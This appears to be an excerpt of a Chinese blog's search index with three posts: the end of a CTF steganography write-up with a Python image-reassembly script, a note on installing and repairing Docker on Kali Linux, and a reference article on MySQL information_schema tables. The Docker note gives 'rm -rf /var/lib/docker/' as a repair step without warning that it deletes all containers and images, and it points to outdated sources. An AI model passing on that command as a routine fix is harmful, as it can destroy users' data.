class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>StegSolve——&gt;data analyze——&gt;字符颠倒<br><a href="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" title="倒立屋"><img src="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" alt="倒立屋" title="倒立屋"></a><br>将图片在Steg中数据分析调至最低位，会发现第一行有一串很像flag的字符，尝试提交报错，更改格式报错，再结合题目，倒立屋，尝试将字符串颠倒过来提交，即按从右往左的顺序，发现对了（这道题的flag有点东西）</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>提取——&gt;联想——&gt;比划<br>在附件中我们发现有{}，不难猜到肯定是flag，我们进行提取得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;</span><br></pre></td></tr></table></figure><p>这么长一串，但是看起来又不像加密过的，回到原题“Keyes’ secret”，联想一下,key会不会是keyboard,再观察提取的字符，突然发现这些字母连起来在键盘上画出来是会是其他的字母形状，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WSX----------------------I</span><br><span class="line">IUYHNBV---------------S</span><br><span class="line">TRFVB------------------C</span><br><span class="line">QAZSEC----------------K</span><br><span class="line">WSXCDE---------------E</span><br><span class="line">EFVT---------------------Y</span><br><span class="line">YHNMKJ----------------B</span><br><span class="line">TGBNMJU--------------O</span><br><span class="line">GRDXCVB--------------A</span><br><span class="line">MNBVCDRTGHU-----R</span><br><span class="line">WSXCFE----------------D</span><br><span class="line">NBVCXSWERF--------P</span><br><span class="line">RFVGYHN--------------H</span><br><span class="line">MNBVCDRTGHU-----R</span><br></pre></td></tr></table></figure><p>以上就是键盘中的秘密</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>题目——&gt;winhex——&gt;AES+key解密<br>观察题目有三个比较敏感的字母AES，不难猜到这道题是AES解码，既然解码就要找到密文，故我们将GIF动图放到winhex中，发现最低端有一行特立独行的密文，<a href="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" title="winhex"><img src="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" alt="winhex" title="winhex"></a><br>进行解码，发现需要提供key,猜想这是什么比赛，哦,ISCC，尝试设置为ISCC，解码，<br><a href="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" title="AES"><img src="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" alt="AES" title="AES"></a>发现成功了，再次进行解码，得到flag</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>binwalk——&gt;python3<br>用过很多信息隐藏提取的工具都没有用，经过尝试，发现binwalk可以将此图分离<br><a href="https://i.loli.net/2019/05/06/5cd035b040d11.png" title="binwalk"><img src="https://i.loli.net/2019/05/06/5cd035b040d11.png" alt="binwalk" title="binwalk"></a><br>得到10个碎片图<br>并且得到一张说明提示</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？</span><br><span class="line"></span><br><span class="line">我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。</span><br></pre></td></tr></table></figure><p>附脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag_pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">143</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#循环出现文件名的后缀数字</span></span><br><span class="line"></span><br><span class="line">    fp=<span class="built_in">open</span>(<span class="string">r&#x27;/root/文档/CTF/fsj/fsj2/puzzle&#x27;</span>+<span class="built_in">str</span>(fn)+<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  <span class="comment">#此处为文件路径及文件名</span></span><br><span class="line"></span><br><span class="line">    all_data=<span class="built_in">bytearray</span>(fp.read())</span><br><span class="line"></span><br><span class="line">    data=all_data[-<span class="number">1250</span>:]                           <span class="comment">#读图片最后1250位</span></span><br><span class="line"></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))   <span class="comment">#新建图像对象,RGBA通道,xy轴为50,颜色为white(255,255,255)</span></span><br><span class="line"></span><br><span class="line">    dex=<span class="number">0</span>                                           <span class="comment">#初始化标记位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片上半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex])) <span class="comment">#设置坐标(j,i) 颜色为(255-data[dex],255-data[dex],255-data[dex])</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片下半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i+<span class="number">25</span>),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex]))  <span class="comment">#设置坐标(j,i+25) RGB值同上</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>,<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pic.getpixel((x,y)) &lt; pic.getpixel((x+<span class="number">13</span>,y)):    <span class="comment">#若x轴0~12的像素值 小于 13~25的值,则写入 0~12的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x,y)))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:                                               <span class="comment">#否则写入后 13~25的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x+<span class="number">13</span>,y)))</span><br><span class="line"></span><br><span class="line">flag_pic.show()</span><br></pre></td></tr></table></figure><p>得出<br><a href="https://i.loli.net/2019/05/06/5cd03841efaf8.png" title="欧鹏·曦文"><img src="https://i.loli.net/2019/05/06/5cd03841efaf8.png" alt="欧鹏·曦文" title="欧鹏·曦文"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Troubleshooting Docker Installation on Kali Linux</title>
      <link href="/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/"/>
      <url>/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/</url>
      
        <content type="html"><![CDATA[<p>Kali安装docker:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line">echo &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">apt-get install apt-transport-https ca-certificates</span><br><span class="line">apt-get update &amp;&amp; sudo apt-get install docker-engine</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用加速器加快镜像的下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/docker/daemon.json</span><br><span class="line">输入一下内容即可</span><br><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://registry.docker-cn.com&quot;]&#125;</span><br></pre></td></tr></table></figure><h3 id="Error"><a href="#Error" class="headerlink" title="Error:"></a>Error:</h3><p>如果用完docker未通过正确方式关闭，导致下次docker无法开启，那么解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/lib/docker/</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">add：</span><br><span class="line"> &#123; &quot;graph&quot;: &quot;/mnt/docker-data&quot;, &quot;storage-driver&quot;: &quot;overlay&quot; &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Issues </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detailed Discussion on information_schema</title>
      <link href="/2019/01/22/Detailed-Discussion-on-information_schema/"/>
      <url>/2019/01/22/Detailed-Discussion-on-information_schema/</url>
      
        <content type="html"><![CDATA[<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。</p><h1 id="1：关于字符集和排序规则相关的系统表"><a href="#1：关于字符集和排序规则相关的系统表" class="headerlink" title="1：关于字符集和排序规则相关的系统表"></a>1：关于字符集和排序规则相关的系统表</h1><p>CHARACTER_SETS ：存储数据库相关字符集信息（memory存储引擎）</p><p>COLLATIONS ：字符集对应的排序规则</p><p>COLLATION_CHARACTER_SET_APPLICABILITY：就是一个字符集和连线校对的一个对应关系而已</p><p>下面我们说一下character sets和collations的区别：</p><p>字符集（character sets）存储字符串，是指人类语言中最小的表义符号。例如’A’、’B’等；</p><p>排序规则（collations）规则比较字符串，collations是指在同一字符集内字符之间的比较规则</p><p>每个字符序唯一对应一种字符集，但一个字符集可以对应多种字符序，其中有一个是默认字符序(Default Collation)</p><p> MySQL中的字符序名称遵从命名惯例：以字符序对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的</p><p>看一下有关于字符集和校对相关的MySQL变量：</p><p>character_set_server：默认的内部操作字符集</p><p>character_set_client：客户端来源数据使用的字符集</p><p>character_set_connection：连接层字符集</p><p>character_set_results：查询结果字符集</p><p>character_set_database：当前选中数据库的默认字符集</p><p>character_set_system：系统元数据(字段名等)字符集</p><p>再看一下MySQL中的字符集转换过程：</p><p>（1）. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</p><p>（2）. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><p>使用每个数据字段的CHARACTER SET设定值；</p><p>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</p><p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p><p>若上述值不存在，则使用character_set_server设定值。</p><p>（3）. 将操作结果从内部操作字符集转换为character_set_results。</p><h1 id="2：权限相关的一些表："><a href="#2：权限相关的一些表：" class="headerlink" title="2：权限相关的一些表："></a>2：权限相关的一些表：</h1><p>SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。</p><p>TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的</p><p>COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。</p><p>USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的</p><p>通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的。可以看得到MySQL的授权也是相当的细密的，可以具体到列，这在某一些应用场景下还是很有用的，比如审计等。</p><h1 id="3：存储数据库系统的实体对象的一些表："><a href="#3：存储数据库系统的实体对象的一些表：" class="headerlink" title="3：存储数据库系统的实体对象的一些表："></a>3：存储数据库系统的实体对象的一些表：</h1><p>COLUMNS：存储表的字段信息，所有的存储引擎</p><p>INNODB_SYS_COLUMNS ：存放的是INNODB的元数据， 他是依赖于SYS_COLUMNS这个统计表而存在的。</p><p>ENGINES ：引擎类型，是否支持这个引擎，描述，是否支持事物，是否支持分布式事务，是否能够支持事物的回滚点</p><p>EVENTS ：记录MySQL中的事件，类似于定时作业</p><p>FILES ：这张表提供了有关在MySQL的表空间中的数据存储的文件的信息，文件存储的位置，这个表的数据是从InnoDB in-memory中拉取出来的，所以说这张表本身也是一个内存表，每次重启重新进行拉取。也就是我们下面要说的INNODB_SYS_DATAFILES这张表。还要注意一点的是这张表包含有临时表的信息，所以说和SYS_DATAFILES 这张表是不能够对等的，还是要从INNODB_SYS_DATAFILES看。如果undo表空间也配置是InnoDB 的话，那么也是会被记录下来的。</p><p>PARAMETERS ：参数表存储了一些存储过程和方法的参数，以及存储过程的返回值信息。存储和方法在ROUTINES里面存储。</p><p>PLUGINS ：基本上是MySQL的插件信息，是否是活动状态等信息。其实SHOW PLUGINS本身就是通过这张表来拉取道德数据</p><p>ROUTINES：关于存储过程和方法function的一些信息，不过这个信息是不包括用户自定义的，只是系统的一些信息。</p><p>SCHEMATA：这个表提供了实例下有多少个数据库，而且还有数据库默认的字符集</p><p>TRIGGERS :这个表记录的就是触发器的信息，包括所有的相关的信息。系统的和自己用户创建的触发器。</p><p>VIEWS :视图的信息，也是系统的和用户的基本视图信息。</p><p>这些表存储的都是一些数据库的实体对象，方便我们进行查询和管理，对于一个DBA来说，这些表能够大大方便我们的工作，更快更方便的了结和查询数据库的相关信息。</p><h1 id="4：约束外键等相关的一些表："><a href="#4：约束外键等相关的一些表：" class="headerlink" title="4：约束外键等相关的一些表："></a>4：约束外键等相关的一些表：</h1><p>REFERENTIAL_CONSTRAINTS：这个表提供的外键相关的信息，而且只提供外键相关信息</p><p>TABLE_CONSTRAINTS ：这个表提供的是 相关的约束信息</p><p>INNODB_SYS_FOREIGN_COLS ：这个表也是存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的</p><p>INNODB_SYS_FOREIGN ：存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的，只不过是单独对于INNODB来说的</p><p>KEY_COLUMN_USAGE：数据库中所有有约束的列都会存下下来，也会记录下约束的名字和类别</p><p>为什么要把外键和约束单列出来呢，因为感觉这是一块独立的东西，虽然我们的生产环境大部分都不会使用外键，因为这会降低性能，但是合理的利用约束还是一个不错的选择，比如唯一约束。</p><h1 id="5：关于管理的一些的一些表："><a href="#5：关于管理的一些的一些表：" class="headerlink" title="5：关于管理的一些的一些表："></a>5：关于管理的一些的一些表：</h1><p>GLOBAL_STATUS ，GLOBAL_VARIABLES，SESSION_STATUS，SESSION_VARIABLES：这四张表分别记录了系统的变量，状态（全局和会话的信息），作为DBA相信大家也都比较熟悉了，而且这几张表也是在系统重启的时候回重新加载的。也就是内存表。</p><p>PARTITIONS ：MySQL分区表相关的信息，通过这张表我们可以查询到分区的相关信息（数据库中已分区的表，以及分区表的分区和每个分区的数据信息）</p><p>PROCESSLIST：show processlist其实就是从这个表拉取数据，PROCESSLIST的数据是他的基础。由于是一个内存表，所以我们相当于在内存中查询一样，这些操作都是很快的。</p><p>INNODB_CMP_PER_INDEX，INNODB_CMP_PER_INDEX_RESET：这两个表存储的是关于压缩INNODB信息表的时候的相关信息,有关整个表和索引信息都有.我们知道对于一个INNODB压缩表来说,不管是数据还是二级索引都是会被压缩的,因为数据本身也可以看作是一个聚集索引。</p><p>INNODB_CMPMEM ，INNODB_CMPMEM_RESET：这两个表是存放关于MySQL INNODB的压缩页的buffer pool信息，但是要注意一点的就是,用这两个表来收集所有信息的表的时候,是会对性能造成严重的影响的,所以说默认是关闭状态的。如果要打开这个功能的话我们要设置innodb_cmp_per_index_enabled参数为ON状态。</p><p>INNODB_BUFFER_POOL_STATS ：表提供有关INNODB 的buffer pool相关信息，和show engine innodb status提供的信息是相同的。也是show engine innodb status的信息来源。</p><p>INNODB_BUFFER_PAGE_LRU，INNODB_BUFFER_PAGE :维护了INNODB LRU LIST的相关信息</p><p>INNODB_BUFFER_PAGE ：这个表就比较屌了，存的是buffer里面缓冲的页数据。查询这个表会对性能产生很严重的影响，千万不要再我们自己的生产库上面执行这个语句，除非你能接受服务短暂的停顿</p><p>INNODB_SYS_DATAFILES ：这张表就是记录的表的文件存储的位置和表空间的一个对应关系(INNODB)</p><p>INNODB_TEMP_TABLE_INFO ：这个表惠记录所有的INNODB的所有用户使用到的信息，但是只能记录在内存中和没有持久化的信息。</p><p>INNODB_METRICS ：提供INNODB的各种的性能指数，是对INFORMATION_SCHEMA的补充，收集的是MySQL的系统统计信息。这些统计信息都是可以手动配置打开还是关闭的。有以下参数都是可以控制的：innodb_monitor_enable, innodb_monitor_disable, innodb_monitor_reset, innodb_monitor_reset_all。</p><p>INNODB_SYS_VIRTUAL :表存储的是INNODB表的虚拟列的信息，当然这个还是比较简单的，在MySQL 5.7中，支持两种Generated Column，即Virtual Generated Column和Stored Generated Column，前者只将Generated Column保存在数据字典中（表的元数据），并不会将这一列数据持久化到磁盘上；后者会将Generated Column持久化到磁盘上，而不是每次读取的时候计算所得。很明显，后者存放了可以通过已有数据计算而得的数据，需要更多的磁盘空间，与实际存储一列数据相比并没有优势，因此，MySQL 5.7中，不指定Generated Column的类型，默认是Virtual Column。</p><p>INNODB_CMP，INNODB_CMP_RESET：存储的是关于压缩INNODB信息表的时候的相关信息，详细请见推荐笔记。</p><p>为什么把这些表列为管理相关的表呢，因为我感觉像连接，分区，压缩表，innodb buffer pool等表，我们通过这些表都能很清晰的看到自己数据库的相关功能的状态，特别是我们通过一些变量更容易窥透MySQL的运行状态，方便我们进行管理。</p><h1 id="6：关于表信息和索引信息的一些表"><a href="#6：关于表信息和索引信息的一些表" class="headerlink" title="6：关于表信息和索引信息的一些表"></a>6：关于表信息和索引信息的一些表</h1><p>TABLES，TABLESPACES，INNODB_SYS_TABLES ，INNODB_SYS_TABLESPACES ：</p><p>TABLES这张表毫无疑问了，就是记录的数据库中表的信息，其中包括系统数据库和用户创建的数据库。show table status like ‘test1’\G的来源就是这个表；</p><p>TABLESPACES 却是标注的活跃表空间。 这个表是不提供关于innodb的表空间信息的，对于我们来说并没有太大作用，因为我们生产库是强制INNODB的；</p><p>INNODB_SYS_TABLES 这张表依赖的是SYS_TABLES数据字典中拉取出来的。此表提供了有关表格的格式和存储特性，包括行格式，压缩页面大小位级别的信息（如适用）</p><p>提供的是关于INNODB的表空间信息，其实和SYS_TABLESPACES 中的INNODB信息是一致的。</p><p>STATISTICS：这个表提供的是关于表的索引信息，所有索引的相关信息。</p><p>INNODB_SYS_INDEXES：提供相关INNODB表的索引的相关信息，和SYS_INDEXES 这个表存储的信息基本是一样的，只不过后者提供的是所有存储引擎的索引信息，后者只提供INNODB表的索引信息。</p><p>INNODB_SYS_TABLESTATS：</p><p>这个表就比较重要了，记录的是MySQL的INNODB表信息以及MySQL优化器会预估SQL选择合适的索引信息，其实就是MySQL数据库的统计信息</p><p>这个表的记录是记录在内存当中的，是一个内存表，每次重启后就会重新记录，所以只能记录从上次重启后的数据库统计信息。有了这个表，我们对于索引的维护就更加方便了，我们可以查询索引的使用次数，方便清理删除不常用的索引，提高表的更新插入等效率，节省磁盘空间。</p><p>INNODB_SYS_FIELDS ：这个表记录的是INNODB的表索引字段信息，以及字段的排名</p><p>INNODB_FT_CONFIG :这张表存的是全文索引的信息</p><p>INNODB_FT_DEFAULT_STOPWORD：这个表存放的是stopword 的信息,是和全文索引匹配起来使用的，和innodb的 INFORMATION_SCHEMA.INNODB_FT_DEFAULT_STOPWORD 是相同的，这个STOPWORD必须是在创建索引之前创建，而且必须指定字段为varchar。stopword 也就是我们所说的停止词，全文检索时，停止词列表将会被读取和检索，在不同的字符集和排序方式下，会造成命中失败或者找不到此数据，这取决于停止词的不同的排序方式。我们可以使用这个功能筛选不必要字段。</p><p>INNODB_FT_INDEX_TABLE：这个表存储的是关于INNODB表有全文索引的索引使用信息的，同样这个表也是要设置innodb_ft_aux_table以后才能够使用的，一般情况下是空的</p><p>INNODB_FT_INDEX_CACHE ：这张表存放的是插入前的记录信息，也是为了避免DML时候昂贵的索引重组</p><h1 id="7：关于MySQL优化相关的一些表"><a href="#7：关于MySQL优化相关的一些表" class="headerlink" title="7：关于MySQL优化相关的一些表"></a>7：关于MySQL优化相关的一些表</h1><p>OPTIMIZER_TRACE ：提供的是优化跟踪功能产生的信息.</p><p>PROFILING：SHOW PROFILE可以深入的查看服务器执行语句的工作情况。以及也能帮助你理解执行语句消耗时间的情况。一些限制是它没有实现的功能，不能查看和剖析其他连接的语句，以及剖析时所引起的消耗。</p><p>SHOW PROFILES显示最近发给服务器的多条语句，条数根据会话变量profiling_history_size定义，默认是15，最大值为100。设为0等价于关闭分析功能。详细信息请见MySQL profile</p><p>INNODB_FT_BEING_DELETED,INNODB_FT_DELETED: INNODB_FT_BEING_DELETED 这张表是INNODB_FT_DELETED的一个快照,只在OPTIMIZE TABLE 的时候才会使用。</p><h1 id="8：关于MySQL事物和锁的相关的一些表"><a href="#8：关于MySQL事物和锁的相关的一些表" class="headerlink" title="8：关于MySQL事物和锁的相关的一些表"></a>8：关于MySQL事物和锁的相关的一些表</h1><p>INNODB_LOCKS:现在获取的锁，但是不含没有获取的锁，而且只是针对INNODB的。</p><p>INNODB_LOCK_WAITS：系统锁等待相关信息，包含了阻塞的一行或者多行的记录，而且还有锁请求和被阻塞改请求的锁信息等。</p><p>INNODB_TRX：包含了所有正在执行的的事物相关信息（INNODB），而且包含了事物是否被阻塞或者请求锁。</p><p>我们通过这些表就能够很方便的查询出来未结束的事物和被阻塞的进程</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
